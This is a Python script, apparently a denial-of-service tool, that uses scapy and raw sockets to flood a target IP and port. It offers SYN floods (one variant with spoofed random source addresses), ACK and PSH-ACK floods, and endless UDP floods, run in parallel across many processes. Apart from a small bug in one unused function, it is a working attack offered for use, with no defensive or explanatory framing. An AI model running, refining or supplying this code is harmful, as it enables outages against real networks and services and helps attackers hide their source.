from scapy.all import *
import time
import random
import multiprocessing
import sys
import socket
from os import urandom as _urandom

args = sys.argv[1:]

def customMethodOne(target_ip, target_port, nn):
    rid = random.randint(1000,65534)
    ip = IP(dst = target_ip, tos=0x0, id=rid, ttl=40, flags="DF")
    tcp = TCP(
        sport = RandShort(), 
        dport = target_port,
        flags = "S",
        seq = 30,
        window = 5850,
        options=[
            ('MSS', 20060),
            ('SackOK', ''),
            ('NOP', None),
            ('WScale', 6),
        ]
        )
    
    for _ in range(100):
        send(p, verbose=0)

    p = ip / tcp
    send(p, loop = 1, verbose = 0, inter=0.0001)


def customMethodTwo(target_ip, target_port, nn):
    rid = random.randint(1000,65534)
    spoofed_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

    ip = IP(src = spoofed_ip, dst = target_ip, tos=0x0, id=rid, ttl=40, flags="DF")
    tcp = TCP(
        sport = RandShort(), 
        dport = target_port,
        flags = "S",
        seq = 30,
        window = 5850,
        options=[
            ('MSS', 20060),
            ('SackOK', ''),
            ('NOP', None),
            ('WScale', 6),
        ]
        )
    

    p = ip / tcp
    send(p, loop = 1, verbose = 0, inter=0.0001)

def synFlood(target_ip, target_port, nn):
    rid = random.randint(1000,65534)
    ip = IP(dst = target_ip, tos=0x0, id=rid, ttl=40, flags="DF")
    tcp = TCP(
        sport = RandShort(), 
        dport = target_port,
        flags = "S",
        seq = 30,
        window = 5850,
        options=[
            ('MSS', 20060),
            ('SackOK', ''),
            ('NOP', None),
            ('WScale', 6),
        ]
        )

    p = ip / tcp
    send(p, loop = 1, verbose = 0)

def ampFlood(target_ip, target_port, nn):
    ip = IP(dst = target_ip, tos=0x0, ttl=60, flags="DF")
    tcp = TCP(
        sport = RandShort(), 
        dport = target_port,
        flags = "A",
        seq = 30,
        ack = 1,
        window = 65499
        )

    p = ip / tcp
    send(p, loop = 1, verbose = 0)

def connectFlood(target_ip, target_port, nn):
    ct = int(time.time())
    ip = IP(dst = target_ip, tos=0x0, ttl=60, flags="DF")
    tcp = TCP(
        sport = RandShort(), 
        dport = target_port,
        flags = "PA",
        seq = 48,
        window = 26337,
        options=[
            ('NOP', None),
            ('NOP', None),
            ("Timestamp", (ct, 588540514))
        ]
        )

    raw = Raw(b"X"*2)
    p = ip / tcp / raw
    send(p, loop = 1, verbose = 0)

def udpFlood(target_ip, target_port, udpSize):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (target_ip, target_port)
            sock.sendto(random._urandom(udpSize), address)
            # for i in range(3):
            #     sock.sendto(random._urandom(1024), address)
        except:
            sock.close()
            print("Error")

if __name__ == "__main__":
    method = args[0] #tcp-syn tcp-amp tcp-connect udp-amp
    tIP = args[1]
    tP = int(args[2])
    numProcess = int(args[3])
    udpPacketSize = int(args[4])

    dataList = [(tIP, tP, udpPacketSize) for _ in range(numProcess)]
    with multiprocessing.Pool(processes=numProcess) as pool:
        if method == "tcp-syn":
            pool.starmap(synFlood, dataList)
        elif method == "tcp-amp":
            pool.starmap(ampFlood, dataList)
        elif method == "tcp-connect":
            pool.starmap(connectFlood, dataList)
        elif method == "udp-amp":
            pool.starmap(udpFlood, dataList)